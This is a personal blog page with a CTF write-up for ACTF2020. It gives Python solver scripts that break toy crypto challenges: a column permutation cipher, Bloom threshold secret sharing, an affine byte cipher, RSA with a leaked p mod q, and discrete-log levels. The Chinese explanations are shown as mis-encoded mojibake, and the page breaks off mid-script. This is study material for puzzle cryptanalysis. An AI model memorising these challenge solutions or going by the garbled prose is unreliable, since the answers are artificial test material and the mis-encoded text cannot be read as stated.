<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WriteUp(ACTF2020) | 0xDktb's Blog</title><meta name="description" content="Preface æœŸæœ«æœˆäº†quqï¼Œæ‰“å®ŒRCTF(å¤šå…ƒcoppersmithé²¨æˆ‘ğŸ˜­)åï¼Œå›æ¥æ‰“äº†ä¸€æ³¢æ ¡èµ›ï¼ˆwebå¬åŒå­¦è¯´åº”è¯¥æœ‰ä¸¶é¡¶ï¼Œä½†é€€å‘webæ‰‹å·²ç»çœ‹ä¸ä¸‹å»äº†- -ï¼Œcryè¿™æ¬¡åº”è¯¥è€ƒè™‘åˆ°äº†æœ‰å­¦å¼Ÿå­¦å¦¹ï¼Œæ‰€ä»¥åå¼•å¯¼å‘ï¼‰ è¿™æ¬¡ACTFæ‰“å®ŒçœŸå›å»è¡¥è¯¾å†…ddläº†ï¼ˆé€ƒ Crypto Column Permutation Cipher [é¢˜è§£åˆ†æ] ç®€å•åˆ—ç½®æ¢å¯†ç ï¼Œçˆ†ç ´key [exp] 123"><meta name="keywords" content="Aurora"><meta name="author" content="0xDktb"><meta name="copyright" content="0xDktb"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://0xdktb.top/2020/06/06/WriteUp-ACTF2020/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="WriteUp(ACTF2020)"><meta property="og:url" content="https://0xdktb.top/2020/06/06/WriteUp-ACTF2020/"><meta property="og:site_name" content="0xDktb's Blog"><meta property="og:description" content="Preface æœŸæœ«æœˆäº†quqï¼Œæ‰“å®ŒRCTF(å¤šå…ƒcoppersmithé²¨æˆ‘ğŸ˜­)åï¼Œå›æ¥æ‰“äº†ä¸€æ³¢æ ¡èµ›ï¼ˆwebå¬åŒå­¦è¯´åº”è¯¥æœ‰ä¸¶é¡¶ï¼Œä½†é€€å‘webæ‰‹å·²ç»çœ‹ä¸ä¸‹å»äº†- -ï¼Œcryè¿™æ¬¡åº”è¯¥è€ƒè™‘åˆ°äº†æœ‰å­¦å¼Ÿå­¦å¦¹ï¼Œæ‰€ä»¥åå¼•å¯¼å‘ï¼‰ è¿™æ¬¡ACTFæ‰“å®ŒçœŸå›å»è¡¥è¯¾å†…ddläº†ï¼ˆé€ƒ Crypto Column Permutation Cipher [é¢˜è§£åˆ†æ] ç®€å•åˆ—ç½®æ¢å¯†ç ï¼Œçˆ†ç ´key [exp] 123"><meta property="og:image" content="https://0xdktb.top/img/star.jpg"><meta property="article:published_time" content="2020-06-06T08:11:04.000Z"><meta property="article:modified_time" content="2020-07-25T15:29:39.981Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="WriteUp(SCTF2020) - Crypto" href="https://0xdktb.top/2020/07/06/WriteUp-SCTF2020-Crypto/"><link rel="next" title="Learning of Elliptic Curve" href="https://0xdktb.top/2020/05/11/Learning-of-Elliptic-Curve/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç°¡"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: false,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true
  }</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">35</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">8</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#column-permutation-cipher"><span class="toc-number">2.1.</span> <span class="toc-text">Column Permutation Cipher</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ"><span class="toc-number">2.1.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.1.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æˆ‘çš„å¯†ç æœ¬"><span class="toc-number">2.2.</span> <span class="toc-text">æˆ‘çš„å¯†ç æœ¬</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bomb-or-boom"><span class="toc-number">2.3.</span> <span class="toc-text">bomb or boom</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#naive-encryption"><span class="toc-number">2.4.</span> <span class="toc-text">naive encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">2.4.1.</span> <span class="toc-text">[exp]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#naive-rsa"><span class="toc-number">2.5.</span> <span class="toc-text">naive rsa</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-3"><span class="toc-number">2.5.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">2.5.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dlpå¤´å·ç©å®¶"><span class="toc-number">2.6.</span> <span class="toc-text">DLPå¤´å·ç©å®¶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-4"><span class="toc-number">2.6.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-4"><span class="toc-number">2.6.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#imitation-game"><span class="toc-number">2.7.</span> <span class="toc-text">Imitation game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-5"><span class="toc-number">2.7.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-5"><span class="toc-number">2.7.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#naive-aes"><span class="toc-number">2.8.</span> <span class="toc-text">naive aes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-6"><span class="toc-number">2.8.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-6"><span class="toc-number">2.8.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tiny_prng0"><span class="toc-number">2.9.</span> <span class="toc-text">tiny_PRNG0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-7"><span class="toc-number">2.9.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-7"><span class="toc-number">2.9.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tiny_prng1"><span class="toc-number">2.10.</span> <span class="toc-text">tiny_PRNG1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-8"><span class="toc-number">2.10.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-8"><span class="toc-number">2.10.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ç­¾åˆ°"><span class="toc-number">3.1.</span> <span class="toc-text">ç­¾åˆ°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ç¥å¥‡çš„æ—¶é’Ÿ"><span class="toc-number">3.2.</span> <span class="toc-text">ç¥å¥‡çš„æ—¶é’Ÿ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-9"><span class="toc-number">3.2.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-9"><span class="toc-number">3.2.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#simplephp"><span class="toc-number">4.1.</span> <span class="toc-text">SimplePHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#é¢˜è§£åˆ†æ-10"><span class="toc-number">4.1.1.</span> <span class="toc-text">[é¢˜è§£åˆ†æ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-10"><span class="toc-number">4.1.2.</span> <span class="toc-text">[exp]</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><header class="post-bg" id="page-header" style="background-image: url(/img/star.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">0xDktb's Blog</a></span><span class="pull-right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">WriteUp(ACTF2020)</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2020-06-06 16:11:04"><i class="far fa-calendar-alt fa-fw"></i> Created 2020-06-06</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-07-25 23:29:39"><i class="fas fa-history fa-fw"></i> Updated 2020-07-25</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/WriteUp/">WriteUp</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"></span><span class="post-meta-commentcount"></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="preface">Preface</h2>
<p>æœŸæœ«æœˆäº†quqï¼Œæ‰“å®ŒRCTF(å¤šå…ƒcoppersmithé²¨æˆ‘ğŸ˜­)åï¼Œå›æ¥æ‰“äº†ä¸€æ³¢æ ¡èµ›ï¼ˆwebå¬åŒå­¦è¯´åº”è¯¥æœ‰ä¸¶é¡¶ï¼Œä½†é€€å‘webæ‰‹å·²ç»çœ‹ä¸ä¸‹å»äº†- -ï¼Œcryè¿™æ¬¡åº”è¯¥è€ƒè™‘åˆ°äº†æœ‰å­¦å¼Ÿå­¦å¦¹ï¼Œæ‰€ä»¥åå¼•å¯¼å‘ï¼‰</p>
<p>è¿™æ¬¡ACTFæ‰“å®Œ<strong>çœŸ</strong>å›å»è¡¥è¯¾å†…ddläº†ï¼ˆé€ƒ</p>
<h2 id="crypto">Crypto</h2>
<h3 id="column-permutation-cipher">Column Permutation Cipher</h3>
<h4 id="é¢˜è§£åˆ†æ">[é¢˜è§£åˆ†æ]</h4>
<p>ç®€å•åˆ—ç½®æ¢å¯†ç ï¼Œçˆ†ç ´key</p>
<h4 id="exp">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ct = </span><br><span class="line">ct_len = len(ct)</span><br><span class="line">pt = [<span class="string">'?'</span>] * ct_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, ct_len // <span class="number">2</span>):</span><br><span class="line">	<span class="keyword">if</span> (ct_len % i) != <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	print(i)</span><br><span class="line">	cnt = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(ct_len // i):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(j, ct_len, ct_len // i):</span><br><span class="line">			pt[cnt] = ct[k]</span><br><span class="line">			cnt += <span class="number">1</span></span><br><span class="line">	flag = <span class="string">""</span>.join(pt)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"actf"</span> <span class="keyword">in</span> flag:</span><br><span class="line">		print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="æˆ‘çš„å¯†ç æœ¬">æˆ‘çš„å¯†ç æœ¬</h3>
<h4 id="é¢˜è§£åˆ†æ-1">[é¢˜è§£åˆ†æ]</h4>
<p>æ›¿æ¢å¯†ç ï¼Œpté©¬ä¸è·¯å¾·é‡‘i have a dreamï¼Œå†™å­—å…¸è·‘è„šæœ¬è¿˜ä¸å¦‚ç›´æ¥sublime- -</p>
<h3 id="bomb-or-boom">bomb or boom</h3>
<h4 id="é¢˜è§£åˆ†æ-2">[é¢˜è§£åˆ†æ]</h4>
<p>æŠ«cryçš®miscé¢˜ï¼Œbloom (k, n)é—¨é™æ–¹æ¡ˆ(k = 4, n = 5)</p>
<ul>
<li>Secret 1: åŸ¹æ ¹</li>
<li>Secret 2: ç›²æ–‡ <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></li>
<li>Secret 4: AAencode</li>
<li>Secret 5: Brainfuck</li>
</ul>
<p>bloomé—¨é™æ¢å¤æ˜æ–‡å³å¯.</p>
<h4 id="exp-1">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="number">2891369521230520600</span></span><br><span class="line">m1 = <span class="number">5539166121540472709</span></span><br><span class="line">a2 = <span class="number">5485400237604727152</span></span><br><span class="line">m2 = <span class="number">9993590208169240051</span></span><br><span class="line">a3 = <span class="number">15126620242797492888</span></span><br><span class="line">m3 = <span class="number">38726457607077802967</span></span><br><span class="line">a4 = <span class="number">63558232650391605454</span></span><br><span class="line">m4 = <span class="number">134070550878039878083</span></span><br><span class="line">a = [a1, a2, a3, a4]</span><br><span class="line">m = [m1, m2, m3, m4]</span><br><span class="line">print(bytes.fromhex(hex(crt(a, m))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
<h3 id="naive-encryption">naive encryption</h3>
<p>Enc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">k = [...]</span><br><span class="line">len_k = len(k)</span><br><span class="line">len_flag = len(flag)</span><br><span class="line">...</span><br><span class="line">cipher = flag</span><br><span class="line">n = <span class="number">1000</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len_flag):</span><br><span class="line">        cipher[i] = (cipher[i] * k[(n + <span class="number">2</span>) % len_k] + k[(n * <span class="number">7</span>) % len_k]) &amp; <span class="number">0xff</span></span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">print(cipher)</span><br></pre></td></tr></table></figure>
<p>Dec</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cipher [i] = ((cipher[i] - k[(n * <span class="number">7</span>) % len_k]) * inverse(k[(n + <span class="number">2</span>) % len_k], <span class="number">0x100</span>)) % <span class="number">0x100</span></span><br></pre></td></tr></table></figure>
<h4 id="exp-2">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = [...]</span><br><span class="line">k = [...]</span><br><span class="line">len_k = len(k)</span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> n &lt;= <span class="number">1000</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">        cipher [i] = ((cipher[i] - k[(n * <span class="number">7</span>) % len_k]) * inverse(k[(n + <span class="number">2</span>) % len_k], <span class="number">0x100</span>)) % <span class="number">0x100</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line">print(bytes(cipher))</span><br></pre></td></tr></table></figure>
<h3 id="naive-rsa">naive rsa</h3>
<h4 id="é¢˜è§£åˆ†æ-3">[é¢˜è§£åˆ†æ]</h4>
<p>å·²çŸ¥<span class="math inline">\(a=p\%q\)</span>ï¼Œå³<span class="math inline">\(p=iq+a\)</span>ï¼Œçˆ†ç ´iä½¿å¾—æ–¹ç¨‹åœ¨ZZä¸‹æœ‰è§£å³å¯.</p>
<h4 id="exp-3">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">1</span>, <span class="number">2</span>**<span class="number">21</span>)):</span><br><span class="line">    r, _ = iroot(a**<span class="number">2</span> + <span class="number">4</span> * i * n, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> _:</span><br><span class="line">        q = (-a + int(r)) // (<span class="number">2</span> * i)</span><br><span class="line">        <span class="keyword">assert</span>(n % q == <span class="number">0</span>)</span><br><span class="line">        p = n // q</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure>
<h3 id="dlpå¤´å·ç©å®¶">DLPå¤´å·ç©å®¶</h3>
<h4 id="é¢˜è§£åˆ†æ-4">[é¢˜è§£åˆ†æ]</h4>
<ul>
<li>level1: <code>p=getPrime(33)</code>ï¼ŒBSGSå¤æ‚åº¦æ§åˆ¶åœ¨<span class="math inline">\(O(2^{16})\)</span>.</li>
<li>level2: ç»™å‡º<span class="math inline">\(g,g^{k}\ mod\ p,m*g^{dk}\ mod\ p\)</span>ï¼Œä¸”<code>d=bytes_to_long(message[0:2])</code>ï¼Œæ‰€ä»¥åœ¨0xffffä¸‹çˆ†ç ´då³å¯è¿˜åŸm.</li>
<li>level3: å‘ç°å¹¶ä¸æ˜¯ECDLP- -å› ä¸ºæœ€åç»™å‡ºçš„cipherä¸æ˜¯æ›²çº¿ä¸Šçš„ç‚¹ï¼Œè€Œæ˜¯å®æ•°èŒƒå›´ä¸Šçš„<code>message[k]*k_Q_x</code>ï¼Œå‘ç°æºç ä¸­çš„<code>get_ng</code>å‡½æ•°å®é™…ä¸Šå°±æ˜¯å°†æ¤­åœ†ä¸Šçš„ç‚¹*100ï¼Œäºæ˜¯é¢˜ç›®ç»™å‡ºåŸºç‚¹Gï¼Œæ±‚å‡º<span class="math inline">\(C=100^{2}G\)</span>ï¼Œ<span class="math inline">\(chr(cipher//C_{x})\)</span>å³ä¸ºå¯¹åº”æ˜æ–‡å­—èŠ‚ï¼Œé€ä½æ¢å¤å³å¯.</li>
</ul>
<h4 id="exp-4">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 